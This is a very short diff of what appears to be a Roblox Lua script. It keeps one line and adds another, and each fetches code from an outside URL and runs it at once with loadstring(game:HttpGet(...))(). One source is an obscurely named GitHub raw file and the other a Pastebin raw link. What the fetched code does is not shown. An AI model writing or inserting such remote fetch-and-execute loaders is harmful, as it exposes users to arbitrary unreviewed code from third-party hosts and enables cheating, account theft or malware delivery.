@@ -1,1 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt"))()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/4CY4JuRj"))()
